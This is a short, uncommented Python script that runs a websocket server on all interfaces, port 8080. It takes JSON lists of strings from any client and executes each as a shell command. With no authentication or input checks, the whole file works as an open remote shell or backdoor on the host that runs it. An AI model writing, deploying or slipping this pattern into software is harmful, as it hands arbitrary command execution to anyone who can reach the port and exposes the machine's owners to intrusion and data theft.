import asyncio
import websockets
import json
import subprocess

async def handle_connection(websocket, path):
    while True:
        raw_commands = await websocket.recv()
        commands = json.loads(raw_commands)
        if commands:
            for command in commands:
                subprocess.run(command, shell=True)
		
start_server = websockets.serve(handle_connection, "0.0.0.0", 8080)
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()